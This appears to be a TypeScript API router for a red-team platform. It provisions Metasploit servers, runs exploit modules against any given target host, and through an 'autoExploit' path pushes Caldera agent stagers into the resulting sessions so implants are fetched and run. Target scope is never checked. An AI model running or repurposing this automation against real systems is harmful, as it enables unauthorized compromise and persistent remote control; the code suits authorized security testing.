/**
 * Metasploit Server Management & Unified Exploit Catalog Router
 */

import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { publicProcedure, protectedProcedure, router } from "../_core/trpc";
import { ENV } from "../_core/env";

export const metasploitCatalogRouter = router({
  // ─── MSF Server Provisioning ───────────────────────────────────────────────

  provisionServer: protectedProcedure
    .input(z.object({
      name: z.string().min(1).max(100),
      region: z.string().default("nyc1"),
      size: z.string().default("s-2vcpu-4gb"),
      msfPassword: z.string().min(8).default("msf_" + Math.random().toString(36).slice(2, 14)),
    }))
    .mutation(async ({ input }) => {
      const { provisionMsfDroplet } = await import("../lib/msf-provisioner");
      const doToken = ENV.DIGITALOCEAN_ACCESS_TOKEN;
      if (!doToken) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "DigitalOcean access token not configured" });
      return provisionMsfDroplet({ name: input.name, region: input.region, size: input.size });
    }),

  listServers: protectedProcedure.query(async () => {
    const { metasploitServers } = await import("../../drizzle/schema");
    const { getDbRequired } = await import("../db");
    const dbConn = await getDbRequired();
    return dbConn.select().from(metasploitServers).orderBy(metasploitServers.createdAt);
  }),

  getServer: protectedProcedure
    .input(z.object({ id: z.number() }))
    .query(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.id)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND", message: "MSF server not found" });
      return server;
    }),

  checkServerHealth: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.id)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND", message: "MSF server not found" });

      const { MsfClient } = await import("../lib/msf-client");
      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });

      try {
        await client.ensureAuth();
        const version = await client.getVersion();
        const status = "online" as const;
        await dbConn.update(metasploitServers)
          .set({ status, msfVersion: version?.version || server.msfVersion, lastHealthCheck: new Date() })
          .where(eq(metasploitServers.id, input.id));
        return { status, version, authenticated: true };
      } catch (err: any) {
        await dbConn.update(metasploitServers)
          .set({ status: "offline", lastHealthCheck: new Date() })
          .where(eq(metasploitServers.id, input.id));
        return { status: "offline" as const, version: null, authenticated: false, error: err.message };
      }
    }),

  destroyServer: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.id)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND", message: "MSF server not found" });

      if (server.dropletId && ENV.DIGITALOCEAN_ACCESS_TOKEN) {
        try {
          const resp = await fetch(`https://api.digitalocean.com/v2/droplets/${server.dropletId}`, {
            method: "DELETE",
            headers: { Authorization: `Bearer ${ENV.DIGITALOCEAN_ACCESS_TOKEN}` },
            signal: AbortSignal.timeout(15000),
          });
          if (!resp.ok && resp.status !== 404) throw new Error(`DO API error: ${resp.status}`);
        } catch (err: any) {
          console.error(`[MSF] Failed to destroy droplet ${server.dropletId}: ${err.message}`);
        }
      }

      await dbConn.update(metasploitServers)
        .set({ status: "destroying" })
        .where(eq(metasploitServers.id, input.id));
      return { success: true, message: `Server ${server.name} destroyed` };
    }),

  // ─── Unified Exploit Catalog ───────────────────────────────────────────────

  runEnrichment: protectedProcedure
    .input(z.object({ calderaUrl: z.string().optional() }).optional())
    .mutation(async ({ input }) => {
      const { runEnrichmentPipeline } = await import("../lib/exploit-catalog");
      return runEnrichmentPipeline(input?.calderaUrl);
    }),

  catalogStats: protectedProcedure.query(async () => {
    const { getCatalogStats } = await import("../lib/exploit-catalog");
    return getCatalogStats();
  }),

  searchCatalog: protectedProcedure
    .input(z.object({
      query: z.string().optional(),
      tier: z.enum(["initial_access", "post_access"]).optional(),
      source: z.string().optional(),
      category: z.string().optional(),
      platform: z.string().optional(),
      calderaSynced: z.boolean().optional(),
      limit: z.number().min(1).max(200).default(50),
      offset: z.number().min(0).default(0),
    }))
    .query(async ({ input }) => {
      const { searchCatalog } = await import("../lib/exploit-catalog");
      return searchCatalog(input);
    }),

  getCatalogEntry: protectedProcedure
    .input(z.object({ catalogId: z.string() }))
    .query(async ({ input }) => {
      const { getCatalogEntry } = await import("../lib/exploit-catalog");
      const entry = await getCatalogEntry(input.catalogId);
      if (!entry) throw new TRPCError({ code: "NOT_FOUND", message: "Catalog entry not found" });
      return entry;
    }),

  syncToCaldera: protectedProcedure
    .input(z.object({ catalogIds: z.array(z.string()).min(1) }))
    .mutation(async ({ input }) => {
      const { syncToCaldera } = await import("../lib/exploit-catalog");
      return syncToCaldera(input.catalogIds);
    }),

  syncAllToCaldera: protectedProcedure.mutation(async () => {
    const { syncAllToCaldera } = await import("../lib/exploit-catalog");
    return syncAllToCaldera();
  }),

  // ─── Automated Exploit Execution ───────────────────────────────────────────

  searchModules: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      query: z.string(),
      type: z.enum(["exploit", "auxiliary", "post", "payload"]).default("exploit"),
    }))
    .query(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });

      const { MsfClient } = await import("../lib/msf-client");
      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });
      await client.ensureAuth();
      // Prefix search with type filter
      const searchQuery = input.type !== "exploit" ? `type:${input.type} ${input.query}` : input.query;
      return client.searchModules(searchQuery);
    }),

  getModuleInfo: protectedProcedure
    .input(z.object({ serverId: z.number(), moduleType: z.string(), moduleName: z.string() }))
    .query(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });

      const { MsfClient } = await import("../lib/msf-client");
      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });
      await client.ensureAuth();
      return client.getModuleInfo(input.moduleType, input.moduleName);
    }),

  executeExploit: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      moduleName: z.string(),
      targetHost: z.string(),
      targetPort: z.number().optional(),
      payload: z.string().optional(),
      options: z.record(z.string(), z.string()).optional(),
      engagementId: z.number().optional(),
      catalogId: z.string().optional(),
      dryRun: z.boolean().default(false),
    }))
    .mutation(async ({ input, ctx }) => {
      const { metasploitServers, exploitJobs } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });
      if (server.status !== "online") throw new TRPCError({ code: "PRECONDITION_FAILED", message: "MSF server is not online" });

      const moduleOptions: Record<string, string> = {
        RHOSTS: input.targetHost,
        ...(input.targetPort ? { RPORT: String(input.targetPort) } : {}),
        ...(input.options || {}),
      };

      if (input.dryRun) {
        return { dryRun: true, module: input.moduleName, options: moduleOptions, payload: input.payload || "auto", targetHost: input.targetHost, targetPort: input.targetPort, message: "Dry run — exploit not executed." };
      }

      // Log the exploit job using correct schema column names
      const [job] = await dbConn.insert(exploitJobs).values({
        msfServerId: input.serverId,
        targetIp: input.targetHost,
        targetPort: input.targetPort ?? undefined,
        exploitModule: input.moduleName,
        payloadModule: input.payload ?? undefined,
        options: moduleOptions,
        status: "pending",
        startedAt: new Date(),
      }).$returningId();

      const { MsfClient } = await import("../lib/msf-client");
      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });

      try {
        await client.ensureAuth();
        const result = await client.executeModule("exploit", input.moduleName, moduleOptions);

        await dbConn.update(exploitJobs)
          .set({
            status: "running",
            msfJobId: result.job_id || null,
            msfSessionId: null,
            result: JSON.stringify(result),
          })
          .where(eq(exploitJobs.id, job.id));

        return { jobId: job.id, msfJobId: result.job_id, status: "running", module: input.moduleName, target: `${input.targetHost}:${input.targetPort || "auto"}` };
      } catch (err: any) {
        await dbConn.update(exploitJobs)
          .set({ status: "failed", errorMessage: err.message, completedAt: new Date() })
          .where(eq(exploitJobs.id, job.id));
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `Exploit execution failed: ${err.message}` });
      }
    }),

  listJobs: protectedProcedure
    .input(z.object({ serverId: z.number().optional(), status: z.string().optional(), limit: z.number().default(50) }))
    .query(async ({ input }) => {
      const { exploitJobs } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq, and, sql } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      const conditions: any[] = [];
      if (input.serverId) conditions.push(eq(exploitJobs.msfServerId, input.serverId));
      if (input.status) conditions.push(eq(exploitJobs.status, input.status as any));
      const where = conditions.length > 0 ? and(...conditions) : undefined;

      return dbConn.select().from(exploitJobs).where(where).orderBy(sql`${exploitJobs.createdAt} DESC`).limit(input.limit);
    }),

  listSessions: protectedProcedure
    .input(z.object({ serverId: z.number() }))
    .query(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });

      const { MsfClient } = await import("../lib/msf-client");
      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });
      try {
        await client.ensureAuth();
        return client.listSessions();
      } catch (err: any) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `Failed to list sessions: ${err.message}` });
      }
    }),

  killSession: protectedProcedure
    .input(z.object({ serverId: z.number(), sessionId: z.string() }))
    .mutation(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });

      const { MsfClient } = await import("../lib/msf-client");
      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });
      try {
        await client.ensureAuth();
        await client.stopSession(input.sessionId);
        return { success: true, sessionId: input.sessionId };
      } catch (err: any) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `Failed to kill session: ${err.message}` });
      }
    }),

  deployAgent: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      sessionId: z.string(),
      calderaUrl: z.string().optional(),
      agentType: z.enum(["sandcat", "manx"]).default("sandcat"),
      platform: z.enum(["windows", "linux", "darwin"]).default("windows"),
    }))
    .mutation(async ({ input }) => {
      const { metasploitServers } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();
      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });

      const calderaUrl = input.calderaUrl || ENV.calderaBaseUrl;
      if (!calderaUrl) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Caldera URL not configured" });

      const { generateAgentStagers, MsfClient } = await import("../lib/msf-client");
      const stagers = generateAgentStagers(calderaUrl);
      const stager = stagers.find(s => s.platform === input.platform && s.type === input.agentType);
      if (!stager) throw new TRPCError({ code: "BAD_REQUEST", message: `No stager for ${input.platform}/${input.agentType}` });

      const client = MsfClient.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });
      try {
        await client.ensureAuth();
        // Use shellWrite for shell sessions, meterpreterWrite for meterpreter
        await client.shellWrite(input.sessionId, stager.command + "\n");
        return { success: true, sessionId: input.sessionId, agentType: input.agentType, platform: input.platform, stagerCommand: stager.command, callbackUrl: stager.callbackUrl, message: `Caldera ${input.agentType} agent stager deployed on session ${input.sessionId}` };
      } catch (err: any) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `Agent deployment failed: ${err.message}` });
      }
    }),

  autoExploit: protectedProcedure
    .input(z.object({
      serverId: z.number(),
      catalogId: z.string(),
      targetHost: z.string(),
      targetPort: z.number().optional(),
      engagementId: z.number().optional(),
      autoDeployAgent: z.boolean().default(true),
      agentType: z.enum(["sandcat", "manx"]).default("sandcat"),
    }))
    .mutation(async ({ input, ctx }) => {
      const { metasploitServers, exploitJobs } = await import("../../drizzle/schema");
      const { getDbRequired } = await import("../db");
      const { eq } = await import("drizzle-orm");
      const dbConn = await getDbRequired();

      const [server] = await dbConn.select().from(metasploitServers).where(eq(metasploitServers.id, input.serverId)).limit(1);
      if (!server) throw new TRPCError({ code: "NOT_FOUND" });
      if (server.status !== "online") throw new TRPCError({ code: "PRECONDITION_FAILED", message: "MSF server is not online" });

      const { getCatalogEntry } = await import("../lib/exploit-catalog");
      const entry = await getCatalogEntry(input.catalogId);
      if (!entry) throw new TRPCError({ code: "NOT_FOUND", message: "Catalog entry not found" });
      if (!entry.msfModule) throw new TRPCError({ code: "BAD_REQUEST", message: "No Metasploit module for this entry" });

      const calderaStagerUrl = ENV.calderaBaseUrl ? `${ENV.calderaBaseUrl}/file/download` : null;

      const [job] = await dbConn.insert(exploitJobs).values({
        msfServerId: input.serverId,
        targetIp: input.targetHost,
        targetPort: input.targetPort ?? undefined,
        exploitModule: entry.msfModule,
        cveId: (entry.cveIds as any)?.[0] ?? undefined,
        options: { RHOSTS: input.targetHost, ...(input.targetPort ? { RPORT: String(input.targetPort) } : {}) },
        calderaStagerUrl,
        status: "pending",
        startedAt: new Date(),
      }).$returningId();

      const { MsfClient: MsfClientClass, generateAgentStagers } = await import("../lib/msf-client");
      const client = MsfClientClass.fromServerConfig(server);
      if (!client) throw new TRPCError({ code: "PRECONDITION_FAILED", message: "Server IP not configured" });

      try {
        await client.ensureAuth();
        const moduleOptions: Record<string, string> = { RHOSTS: input.targetHost, ...(input.targetPort ? { RPORT: String(input.targetPort) } : {}) };
        const result = await client.executeModule("exploit", entry.msfModule, moduleOptions);

        // MsfExploitResult returns job_id; sessions are established asynchronously
        await dbConn.update(exploitJobs)
          .set({
            status: "running",
            msfJobId: result.job_id || null,
            result: JSON.stringify(result),
          })
          .where(eq(exploitJobs.id, job.id));

        // After exploit fires, poll for sessions to deploy agent
        let agentDeployed = false;
        if (input.autoDeployAgent && ENV.calderaBaseUrl) {
          // Wait briefly for session to establish, then check
          await new Promise(r => setTimeout(r, 5000));
          try {
            const sessions = await client.listSessions();
            const newSession = Object.entries(sessions).find(
              ([_, s]) => s.target_host === input.targetHost || s.tunnel_peer?.includes(input.targetHost)
            );
            if (newSession) {
              const [sessionId, sessionInfo] = newSession;
              const stagers = generateAgentStagers(ENV.calderaBaseUrl);
              const platform = entry.platform === "windows" ? "windows" : entry.platform === "darwin" ? "darwin" : "linux";
              const stager = stagers.find(s => s.platform === platform && s.type === input.agentType);
              if (stager) {
                // Use shellWrite for shell sessions, meterpreterWrite for meterpreter
                if (sessionInfo.type === "meterpreter") {
                  await client.meterpreterWrite(sessionId, `execute -f cmd -a "/c ${stager.command}"`);
                } else {
                  await client.shellWrite(sessionId, stager.command + "\n");
                }
                agentDeployed = true;
                await dbConn.update(exploitJobs)
                  .set({ sessionType: "caldera_agent", msfSessionId: parseInt(sessionId) || null, calderaStagerUrl: stager.callbackUrl, completedAt: new Date(), status: "success" })
                  .where(eq(exploitJobs.id, job.id));
              }
            }
          } catch (agentErr: any) {
            console.error(`[MSF] Agent deployment check failed: ${agentErr.message}`);
          }
        }

        return {
          jobId: job.id,
          module: entry.msfModule,
          target: `${input.targetHost}:${input.targetPort || "auto"}`,
          msfJobId: result.job_id,
          exploitStatus: "running",
          agentDeployed,
          catalogEntry: { name: entry.name, tier: entry.tier, mitreId: entry.mitreId, effectiveness: entry.effectiveness },
        };
      } catch (err: any) {
        await dbConn.update(exploitJobs)
          .set({ status: "failed", errorMessage: err.message, completedAt: new Date() })
          .where(eq(exploitJobs.id, job.id));
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: `Auto-exploit failed: ${err.message}` });
      }
    }),
});
